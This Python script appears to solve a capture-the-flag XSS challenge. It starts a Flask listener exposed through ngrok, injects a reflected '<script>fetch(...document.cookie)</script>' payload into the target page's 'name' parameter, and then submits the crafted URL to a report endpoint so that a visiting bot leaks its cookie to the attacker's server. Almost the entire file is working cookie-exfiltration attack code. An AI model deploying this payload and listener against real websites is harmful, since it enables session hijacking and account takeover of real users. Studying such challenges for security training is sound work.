import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))
from utils import get_session, find_flag

from flask import Flask, request
from pyngrok import ngrok
import threading
import time

BASE_URL = "https://xss-playground-1.quoccacorp.com"
LISTEN_PORT = 8000

app = Flask(__name__)

@app.route('/', methods=["GET", "OPTIONS"])
def index():
    for key, value in request.args.items():
        find_flag(value)

    return "OK"

class Solver:
    def __init__(self):
        self.session = get_session()
        self.start_server_thread()
        self.ngrok_public_url = ngrok.connect(LISTEN_PORT, "http").public_url

    def start_server_thread(self):
        def run_app():
            app.run(host="0.0.0.0", port=LISTEN_PORT)
        server_thread = threading.Thread(target=run_app, daemon=True)
        server_thread.start()

    def main(self):
        PAYLOAD = f'<script>fetch("{self.ngrok_public_url}/?q=" + document.cookie, {{headers: {{"ngrok-skip-browser-warning": "yes"}}}})</script>'
        response = self.session.get(BASE_URL, params={"name": PAYLOAD})

        redirect_url = response.url
        self.session.post(f"{BASE_URL}/report", data={"url": redirect_url})

        time.sleep(1)

if __name__ == "__main__":
    Solver().main()
